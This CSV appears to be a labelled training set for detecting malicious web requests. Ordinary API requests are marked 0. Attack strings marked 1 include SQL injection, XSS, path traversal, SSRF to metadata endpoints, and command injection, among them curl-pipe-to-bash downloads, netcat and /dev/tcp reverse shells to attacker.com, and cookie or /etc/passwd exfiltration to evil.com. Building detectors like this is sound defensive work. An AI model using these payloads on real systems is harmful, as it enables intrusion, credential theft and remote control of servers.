"text","label"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"url=http://127.0.0.1/admin","1"
"name=Omar email=121@mail.com","0"
"exec=& net user hacker Password1 /add","1"
"username=root&password=123456","1"
"name=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"DELETE /profile User-Agent: python-requests/2.31.0","0"
"page=34&limit=20","0"
"GET /health HTTP/1.1","0"
"GET /dashboard/7518","0"
"Authorization: Bearer validtoken198","0"
"user=1' OR '1'='1' /*","1"
"ping=|| nc -e /bin/sh attacker.com 4444","1"
"GET /health HTTP/1.1","0"
"GET /dashboard/2235","0"
"url=http://localhost:8080","1"
"GET /health HTTP/1.1","0"
"category=audio page=5","0"
"name=Ahmed email=623@mail.com","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"page=24&limit=10","0"
"filename=|| nc -e /bin/sh attacker.com 4444","1"
"user_id=253&action=view","0"
"url=dict://127.0.0.1:11211/","1"
"username=user&password=batman","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=headphones","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"filename=`curl -s http://attacker.com/shell.sh | bash`","1"
"message=<iframe src=javascript:alert(1)>","1"
"user_id=105&action=view","0"
"limit=20&offset=0","0"
"name=Nour email=312@mail.com","0"
"url=dict://127.0.0.1:11211/","1"
"category=audio page=4","0"
"../../.git/config","1"
"category=tablets page=9","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"message=<input onfocus=alert(1) autofocus>","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /profile body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"limit=20&offset=0","0"
"GET /health HTTP/1.1","0"
"User-Agent: Nmap Scripting Engine","1"
"GET /api/data/8513","0"
"username=administrator&password=qwerty","1"
"GET /api/login/1265","0"
"name=Nour email=449@mail.com","0"
"page=33&limit=20","0"
"GET /etc/passwd%00","1"
"login attempt failed username admin invalid credentials","1"
"include=....//....//etc/passwd","1"
"GET /server-status HTTP/1.1","1"
"GET /api/orders/7861","0"
"comment=<body onload=alert(1)>","1"
"order_id=ORD-9532 status=confirmed","0"
"search=tablet","0"
"POST /api/data body=command`curl -s http://attacker.com/shell.sh | bash`","1"
"POST /api/users body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"DELETE /settings User-Agent: PostmanRuntime/7.36.0","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"exec=| cat /etc/passwd","1"
"Authorization: Bearer validtoken342","0"
"GET /dashboard?user=ahmed&filter=active","0"
"multiple failed login attempts detected for admin","1"
"username=user&password=123456","1"
"GET /api/products/581","0"
"order_id=ORD-4366 status=confirmed","0"
"name=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"POST /api/feedback body=<svg/onload=alert(1)>","1"
"password spray attack detected multiple users","1"
"page=27&limit=20","0"
"POST /api/orders User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"url=http://localhost:8080","1"
"ping=; cat /etc/shadow","1"
"page=11&limit=10","0"
"path=../../../.env","1"
"message=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /profile/9008","0"
"GET /settings/8251","0"
"Authorization: Bearer validtoken831","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"file:///etc/passwd","1"
"order_id=ORD-2875 status=confirmed","0"
"password spray attack detected multiple users","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"& whoami","1"
"order_id=ORD-2014 status=confirmed","0"
"search=laptop","0"
"GET /admin HTTP/1.1","1"
"search=headphones","0"
"user_id=19&action=view","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"id=1 AND SLEEP(5)--","1"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"PUT /api/users User-Agent: python-requests/2.31.0","0"
"GET /dashboard/4237","0"
"id=123&format=json","0"
"url=gopher://127.0.0.1:25/","1"
"GET /api/search?category=electronics&page=1","0"
"url=dict://127.0.0.1:11211/","1"
"user=ahmed&filter=active","0"
"path=../../../.env","1"
"search=phone","0"
"GET /health HTTP/1.1","0"
"order_id=ORD-1706 status=confirmed","0"
"page=12&limit=10","0"
"GET /health HTTP/1.1","0"
"User-Agent: Nmap Scripting Engine","1"
"POST /settings body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/orders/6739","0"
"user=' OR 1=1--","1"
"PUT /api/search?q=smartphone&brand=samsung","0"
"' UNION ALL SELECT NULL,NULL,NULL--","1"
"exec=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"order_id=' UNION SELECT username,password FROM users--","1"
"order_id=ORD-9057 status=confirmed","0"
"POST /dashboard body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"page=10&limit=50","0"
"POST /api/feedback body=<video src=1 onerror=alert(1)>","1"
"page=28&limit=10","0"
"order_id=ORD-8325 status=confirmed","0"
"user_id=996&action=view","0"
"url=dict://127.0.0.1:11211/","1"
"page=12&limit=20","0"
"GET /api/users?id=1'	OR	1=1--","1"
"date=2024-01-15&type=order","0"
"POST /api/login username=1'%09OR%091=1-- password=test","1"
"Authorization: Bearer validtoken274","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"POST /api/login body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"category=phones page=7","0"
"url=http://192.168.1.1","1"
"GET ../../../../etc/shadow","1"
"POST /api/search body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user_id=724&action=view","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"cmd=$(whoami)","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-5128 status=confirmed","0"
"brute force attempt on login endpoint from single ip","1"
"POST /api/orders User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"1'%09OR%091=1--","1"
"GET /robots.txt scan probe reconnaissance","1"
"url=http://metadata.google.internal","1"
"name=Ahmed email=394@mail.com","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=laptop","0"
"user=ahmed&filter=active","0"
"user_id=37&action=view","0"
"page=18&limit=50","0"
"order_id=ORD-9710 status=confirmed","0"
"search=laptop&sort=price","0"
"GET /health HTTP/1.1","0"
"category=electronics&page=1","0"
"order_id=ORD-8183 status=confirmed","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"url=http://192.168.1.1","1"
"category=tablets page=6","0"
"DELETE /api/data?date=2024-01-15&type=order","0"
"name=Sara email=513@mail.com","0"
"username=root&password=batman","1"
"url=http://metadata.google.internal","1"
"host=; ping -c 4 attacker.com","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"url=http://127.0.0.1/admin","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"url=file:///etc/passwd","1"
"GET /api/login/1773","0"
"GET /health HTTP/1.1","0"
"..%2F..%2F..%2Fetc%2Fpasswd","1"
"$(curl -s http://attacker.com/shell.sh)","1"
"search=laptop","0"
"Authorization: Bearer validtoken207","0"
"page=43&limit=10","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"cmd=& ipconfig","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"username=user&password=superman","1"
"category=audio page=4","0"
"POST /api/login body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"login attempt failed username admin invalid credentials","1"
"name=Omar email=68@mail.com","0"
"order_id=ORD-2779 status=confirmed","0"
"title=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"ping=| cat /etc/passwd","1"
"GET /profile/8553","0"
"username=' OR '1'='1","1"
"url=http://127.0.0.1/admin","1"
"order_id=ORD-5765 status=confirmed","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken854","0"
"page=49&limit=20","0"
"url=dict://127.0.0.1:11211/","1"
"comment=<script>alert(document.cookie)</script>","1"
"| cat /etc/passwd","1"
"url=dict://127.0.0.1:11211/","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"brute force attempt on login endpoint from single ip","1"
"username=1'; INSERT INTO users VALUES('hacker','pass')--","1"
"cmd=`id`","1"
"category=phones page=3","0"
"category=phones page=5","0"
"message=<video src=1 onerror=alert(1)>","1"
"file=..%2F..%2F..%2Fetc%2Fpasswd","1"
"user_id=850&action=view","0"
"GET /api/users?id=1 AND 1=CONVERT(int,@@version)--","1"
"category=audio page=3","0"
"order_id=ORD-8529 status=confirmed","0"
"POST /api/users body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"username=user&password=batman","1"
"POST /api/data?status=pending&priority=high","0"
"<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"fetch=http://internal-service:8080/secret","1"
"exec=$(curl -s http://attacker.com/shell.sh)","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"javascript:alert(1)","1"
"DELETE /api/login User-Agent: PostmanRuntime/7.36.0","0"
"GET /health HTTP/1.1","0"
"category=audio page=10","0"
"GET /api/orders?user=ahmed&filter=active","0"
"GET /api/swagger.json HTTP/1.1","1"
"page=12&limit=20","0"
"user_id=353&action=view","0"
"search=laptop","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"POST /profile body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=274&action=view","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"category=laptops page=5","0"
"search=laptop","0"
"POST /api/users User-Agent: axios/1.6.0","0"
"GET /health HTTP/1.1","0"
"status=pending&priority=high","0"
"1'||'1'='1","1"
"url=http://10.0.0.1","1"
"category=laptops page=10","0"
"category=audio page=1","0"
"name=Nour email=942@mail.com","0"
"message=<svg/onload=alert(1)>","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Authorization: Bearer validtoken554","0"
"POST /api/data body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"POST /settings?user=ahmed&filter=active","0"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"url=http://metadata.google.internal","1"
"GET /dashboard User-Agent: PostmanRuntime/7.36.0","0"
"password spray attack detected multiple users","1"
"order_id=ORD-2366 status=confirmed","0"
"POST /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /health HTTP/1.1","0"
"name=Sara email=493@mail.com","0"
"user_id=941&action=view","0"
"username=root&password=password123","1"
"id=123&format=json","0"
"POST /api/feedback body=<textarea onfocus=alert(1) autofocus>","1"
"name=Omar email=234@mail.com","0"
"| cat /etc/passwd","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"search=tablet","0"
"username=user&password=batman","1"
"status=pending&priority=high","0"
"message=<img src='x' onerror='alert(1)'>","1"
"exec=$(whoami)","1"
"user_id=569&action=view","0"
"order_id=ORD-2012 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"host=| cat /etc/passwd","1"
"url=http://metadata.google.internal","1"
"q=smartphone&brand=samsung","0"
"GET /health HTTP/1.1","0"
"category=laptops page=6","0"
"DELETE /dashboard?user=ahmed&filter=active","0"
"comment=<img src=`javascript:alert(1)`>","1"
"category=laptops page=10","0"
"GET /api/search?q=javascript:alert(document.cookie)","1"
"GET ../../../../etc/passwd","1"
"POST /api/data body=command| uname -a","1"
"username=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"POST /api/search body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"Authorization: Bearer validtoken199","0"
"name=Nour email=640@mail.com","0"
"brute force attempt on login endpoint from single ip","1"
"name=Omar email=263@mail.com","0"
"POST /api/data body=command& whoami","1"
"GET /profile User-Agent: PostmanRuntime/7.36.0","0"
"fetch=http://internal-service:8080/secret","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"DELETE /api/search?category=electronics&page=1","0"
"q=smartphone&brand=samsung","0"
"page=39&limit=50","0"
"GET /profile/3976","0"
"GET /health HTTP/1.1","0"
"status=pending&priority=high","0"
"id=' UNION SELECT username,password FROM users--","1"
"password spray attack detected multiple users","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"| cat /etc/passwd","1"
"GET /profile/2940","0"
"POST /api/data body=command& ipconfig","1"
"GET /api/users?id=1 OR 1=1","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"repeated authentication failure admin account locked","1"
"filename=; ls -la","1"
"category=phones page=10","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"user_id=835&action=view","0"
"GET /api/files?name=../../../../proc/self/environ","1"
"include=../../../../var/log/apache2/access.log","1"
"DELETE /api/products?search=laptop&sort=price","0"
"Authorization: Bearer validtoken690","0"
"../../.git/config","1"
"search=laptop","0"
"GET /api/products/5127","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"search=headphones","0"
"date=2024-01-15&type=order","0"
"title=<script>alert(1)</script>","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"host=& net user hacker Password1 /add","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"user=1'	OR	1=1--","1"
"GET /health HTTP/1.1","0"
"PUT /settings User-Agent: PostmanRuntime/7.36.0","0"
"DELETE /api/users?limit=20&offset=0","0"
"search=headphones","0"
"GET /api/users?id=' OR '1'='1'--","1"
"file=file:///etc/passwd","1"
"user_id=655&action=view","0"
"POST /settings?status=pending&priority=high","0"
"username=administrator&password=abc123","1"
"user_id=227&action=view","0"
"host=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"POST /api/products body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"description=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"name=Omar email=574@mail.com","0"
"url=file:///etc/passwd","1"
"page=38&limit=10","0"
"POST /profile body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=laptop","0"
"url=dict://127.0.0.1:11211/","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /web.config HTTP/1.1","1"
"username=administrator&password=password","1"
"user_id=798&action=view","0"
"url=http://192.168.1.1","1"
"GET /.git/config HTTP/1.1","1"
"status=pending&priority=high","0"
"username=user&password=admin123","1"
"page=29&limit=20","0"
"file=../../../../var/log/apache2/access.log","1"
"GET /profile/5576","0"
"POST /dashboard?user=ahmed&filter=active","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://127.0.0.1/admin","1"
"POST /api/data body=command$(whoami)","1"
"GET /health HTTP/1.1","0"
"username=user&password=letmein","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=19&limit=50","0"
"search=phone","0"
"page=25&limit=20","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user_id=769&action=view","0"
"user=ahmed&filter=active","0"
"ping=; ping -c 4 attacker.com","1"
"order_id=ORD-8476 status=confirmed","0"
"username=root&password=admin","1"
"url=http://metadata.google.internal","1"
"GET ....//....//etc/passwd","1"
"page=2&limit=10","0"
"GET ../../../etc/shadow","1"
"name=Omar email=739@mail.com","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"status=pending&priority=high","0"
"GET /health HTTP/1.1","0"
"username=administrator&password=password123","1"
"fetch=http://internal-service:8080/secret","1"
"category=tablets page=8","0"
"search=%3Cscript%3Ealert(1)%3C/script%3E","1"
"GET /api/users/4615","0"
"search=laptop&sort=price","0"
"user_id=564&action=view","0"
"category=laptops page=2","0"
"GET /admin HTTP/1.1","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /server-status HTTP/1.1","1"
"name=Omar email=292@mail.com","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"user_id=44&action=view","0"
"search=laptop","0"
"GET /health HTTP/1.1","0"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"order_id=1' OR '1'='1' /*","1"
"GET /api/orders?status=pending&priority=high","0"
"GET /config.php HTTP/1.1","1"
"brute force attempt on login endpoint from single ip","1"
"search=laptop&sort=price","0"
"user_id=275&action=view","0"
"GET /backup.sql HTTP/1.1","1"
"file=..%2F..%2F..%2Fetc%2Fpasswd","1"
"search=<input onfocus=alert(1) autofocus>","1"
"name=Lina email=747@mail.com","0"
"GET /robots.txt scan probe reconnaissance","1"
"order_id=ORD-4953 status=confirmed","0"
"name=Nour email=536@mail.com","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"ping=& net user hacker Password1 /add","1"
"filename=& whoami","1"
"search=tablet","0"
"POST /api/orders body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=headphones","0"
"GET /wp-admin HTTP/1.1","1"
"GET /profile/3034","0"
"search=1' OR '1'='1' /*","1"
"category=tablets page=4","0"
"order_id=ORD-7130 status=confirmed","0"
"/etc/passwd%00","1"
"POST /api/users?status=pending&priority=high","0"
"PUT /settings User-Agent: axios/1.6.0","0"
"include=../../../../var/log/apache2/access.log","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=laptop","0"
"GET /api/files?name=../../../.env","1"
"username=1'||'1'='1","1"
"POST /api/login username=admin'# password=test","1"
"cmd=& net user hacker Password1 /add","1"
"GET /api/data/1108","0"
"user_id=335&action=view","0"
"GET /api/files?name=..%2F..%2F..%2Fetc%2Fpasswd","1"
"brute force attempt on login endpoint from single ip","1"
"name=Sara email=228@mail.com","0"
"search=<iframe src=javascript:alert(1)>","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/data/8116","0"
"id=1'%09OR%091=1--","1"
"GET /.env HTTP/1.1","1"
"GET /api/data?q=smartphone&brand=samsung","0"
"search=laptop&sort=price","0"
"Authorization: Bearer validtoken294","0"
"comment=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"GET /settings/5663","0"
"name=Sara email=704@mail.com","0"
"filename=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/search?q=<div onmouseover=alert(1)>hover</div>","1"
"user_id=343&action=view","0"
"GET /health HTTP/1.1","0"
"name=Nour email=607@mail.com","0"
"name=Omar email=523@mail.com","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"User-Agent: Nikto/2.5.0","1"
"name=Sara email=362@mail.com","0"
"username=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"description=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"POST /api/products body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=http://127.0.0.1/admin","1"
"file=/etc/passwd%00","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"category=phones page=10","0"
"POST /api/data User-Agent: python-requests/2.31.0","0"
"GET /dashboard/7816","0"
"user_id=547&action=view","0"
"page=4&limit=20","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"ping=|| nc -e /bin/sh attacker.com 4444","1"
"page=11&limit=20","0"
"POST /dashboard body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"' OR '1'='1'--","1"
"GET /wp-admin HTTP/1.1","1"
"search=tablet","0"
"comment=<script>alert('XSS')</script>","1"
"GET /config.php HTTP/1.1","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user_id=705&action=view","0"
"url=http://10.0.0.1","1"
"User-Agent: Nikto/2.5.0","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"url=http://metadata.google.internal","1"
"GET /api/products/382","0"
"page=45&limit=50","0"
"username=1' /*!OR*/ 1=1--","1"
"search=<body onload=alert(1)>","1"
"Authorization: Bearer validtoken583","0"
"name=Lina email=413@mail.com","0"
"search=tablet","0"
"url=file:///etc/passwd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"login attempt failed username admin invalid credentials","1"
"search=1'; EXEC xp_cmdshell('whoami')--","1"
"DELETE /api/products User-Agent: PostmanRuntime/7.36.0","0"
"category=tablets page=6","0"
"page=22&limit=50","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /robots.txt scan probe reconnaissance","1"
"search=laptop","0"
"category=laptops page=4","0"
"username=user&password=password","1"
"PUT /api/users User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /settings/3564","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /profile body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"DELETE /api/data User-Agent: PostmanRuntime/7.36.0","0"
"ping=& whoami","1"
"username=1'/**/OR/**/1=1--","1"
"message=<scr ipt>alert(1)</scr ipt>","1"
"GET /wp-admin HTTP/1.1","1"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"cmd=$(whoami)","1"
"POST /api/users body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"page=16&limit=50","0"
"url=gopher://127.0.0.1:25/","1"
"host=| cat /etc/passwd","1"
"POST /dashboard body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"ping=`id`","1"
"username=administrator&password=1234567890","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-1328 status=confirmed","0"
"id=' OR 1=1#","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"url=http://127.0.0.1/admin","1"
"search=laptop&sort=price","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"POST /api/login body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"POST /dashboard body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"category=laptops page=8","0"
"url=gopher://127.0.0.1:25/","1"
"path=/etc/passwd%00","1"
"& whoami","1"
"PUT /api/products?status=pending&priority=high","0"
"POST /api/feedback body=javascript:alert(1)","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"login attempt failed username admin invalid credentials","1"
"POST /api/feedback body=javascript:alert(1)","1"
"GET /api/search?q=<audio src=1 onerror=alert(1)>","1"
"GET /health HTTP/1.1","0"
"repeated authentication failure admin account locked","1"
"../../../../etc/shadow","1"
"GET /settings?date=2024-01-15&type=order","0"
"POST /settings body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"limit=20&offset=0","0"
"GET /settings/7663","0"
"GET /api/products User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"include=../../../../proc/self/environ","1"
"file=/etc/passwd%00","1"
"order_id=ORD-5832 status=confirmed","0"
"search=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"filename=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"category=laptops page=2","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/orders?date=2024-01-15&type=order","0"
"GET /api/users/3696","0"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /server-status HTTP/1.1","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /api/users/9364","0"
"../../.git/config","1"
"page=5&limit=10","0"
"order_id=ORD-2138 status=confirmed","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=laptop&sort=price","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /dashboard/7666","0"
"username=root&password=batman","1"
"user_id=790&action=view","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"login attempt failed username admin invalid credentials","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Lina email=659@mail.com","0"
"GET /health HTTP/1.1","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"page=35&limit=10","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"id=1 AND SLEEP(5)--","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"Authorization: Bearer validtoken990","0"
"GET /config.php HTTP/1.1","1"
"exec=| uname -a","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=http://127.0.0.1/admin","1"
"GET /api/users?id=' OR 'x'='x","1"
"GET /console HTTP/1.1","1"
"path=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /api/users?id=' UNION SELECT NULL--","1"
"name=Omar email=495@mail.com","0"
"name=Sara email=300@mail.com","0"
"POST /dashboard User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"order_id=ORD-4302 status=confirmed","0"
"PUT /settings?status=pending&priority=high","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"username=root&password=1234567890","1"
"name=Ahmed email=28@mail.com","0"
